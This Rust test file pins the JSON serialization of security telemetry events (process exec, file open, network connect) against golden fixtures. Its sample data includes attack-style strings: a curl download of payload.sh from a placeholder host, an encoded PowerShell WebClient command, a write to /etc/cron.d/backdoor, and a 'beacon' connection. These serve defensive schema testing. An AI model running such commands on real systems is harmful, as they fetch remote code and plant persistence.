//! Golden-fixture tests: the serialized form of every event type is pinned by the
//! files under `tests/fixtures/v1/`. A failure here means a serialization-visible
//! schema change — that is a SCHEMA_VERSION bump and a new fixture directory, never
//! an edit to these files (see crate docs).

use std::net::IpAddr;

use schema::{ConnectEvent, Event, EventMeta, ExecEvent, FileOpenEvent, User};

fn fixture(name: &str) -> serde_json::Value {
    let path = format!(
        "{}/tests/fixtures/v1/{name}.json",
        env!("CARGO_MANIFEST_DIR")
    );
    serde_json::from_str(&std::fs::read_to_string(&path).expect(&path)).expect(&path)
}

/// Serialize `event`, compare against the fixture, and check the round trip.
fn assert_golden(event: &Event, name: &str) {
    let serialized = serde_json::to_value(event).unwrap();
    assert_eq!(serialized, fixture(name), "fixture mismatch: {name}");
    let back: Event = serde_json::from_value(serialized).unwrap();
    assert_eq!(&back, event, "round trip mismatch: {name}");
}

#[test]
fn exec_unix_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix {
                    uid: 1000,
                    gid: 1000,
                },
                timestamp_ns: 1_756_900_000_123_456_789,
                comm: "bash".into(),
            },
            image_path: "/usr/bin/curl".into(),
            cmdline: "curl -fsSL https://example.test/payload.sh -o /tmp/payload.sh".into(),
            argv: [
                "curl",
                "-fsSL",
                "https://example.test/payload.sh",
                "-o",
                "/tmp/payload.sh",
            ]
            .map(String::from)
            .into(),
        }),
        "exec",
    );
}

#[test]
fn exec_windows_golden() {
    assert_golden(
        &Event::Exec(ExecEvent {
            meta: EventMeta {
                pid: 5120,
                ppid: 620,
                user: User::Windows {
                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
                    integrity_level: Some(0x3000),
                },
                timestamp_ns: 1_756_900_001_000_000_000,
                comm: "powershell.exe".into(),
            },
            image_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
            cmdline: "powershell.exe -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA".into(),
            argv: vec![],
        }),
        "exec_windows",
    );
}

#[test]
fn file_open_golden() {
    assert_golden(
        &Event::FileOpen(FileOpenEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unix { uid: 0, gid: 0 },
                timestamp_ns: 1_756_900_002_000_000_000,
                comm: "cron".into(),
            },
            path: "/etc/cron.d/backdoor".into(),
            flags: 0o1101, // O_WRONLY | O_CREAT | O_TRUNC
        }),
        "file_open",
    );
}

#[test]
fn connect_v6_golden() {
    assert_golden(
        &Event::Connect(ConnectEvent {
            meta: EventMeta {
                pid: 4242,
                ppid: 1337,
                user: User::Unknown,
                timestamp_ns: 1_756_900_003_000_000_000,
                comm: "beacon".into(),
            },
            daddr: "2001:db8::1337".parse::<IpAddr>().unwrap(),
            dport: 8443,
        }),
        "connect",
    );
}

#[test]
fn unbounded_cmdline_survives() {
    // Audit F-4: multi-kilobyte encoded command lines must round-trip untouched.
    let long = format!("powershell.exe -EncodedCommand {}", "A".repeat(8 * 1024));
    let event = Event::Exec(ExecEvent {
        meta: EventMeta {
            pid: 1,
            ppid: 0,
            user: User::Unknown,
            timestamp_ns: 0,
            comm: "powershell.exe".into(),
        },
        image_path: r"C:\long\path\that\exceeds\the\old\256\byte\limit".repeat(8),
        cmdline: long.clone(),
        argv: vec![],
    });
    let back: Event = serde_json::from_str(&serde_json::to_string(&event).unwrap()).unwrap();
    match &back {
        Event::Exec(e) => assert_eq!(e.cmdline, long),
        other => panic!("wrong variant: {other:?}"),
    }
}

#[test]
fn meta_accessor_covers_all_variants() {
    let meta = EventMeta {
        pid: 7,
        ppid: 1,
        user: User::Unix { uid: 1, gid: 1 },
        timestamp_ns: 42,
        comm: "x".into(),
    };
    let events = [
        Event::Exec(ExecEvent {
            meta: meta.clone(),
            image_path: String::new(),
            cmdline: String::new(),
            argv: vec![],
        }),
        Event::FileOpen(FileOpenEvent {
            meta: meta.clone(),
            path: String::new(),
            flags: 0,
        }),
        Event::Connect(ConnectEvent {
            meta: meta.clone(),
            daddr: "10.0.0.1".parse::<IpAddr>().unwrap(),
            dport: 80,
        }),
    ];
    for e in &events {
        assert_eq!(e.meta().pid, 7);
    }
}
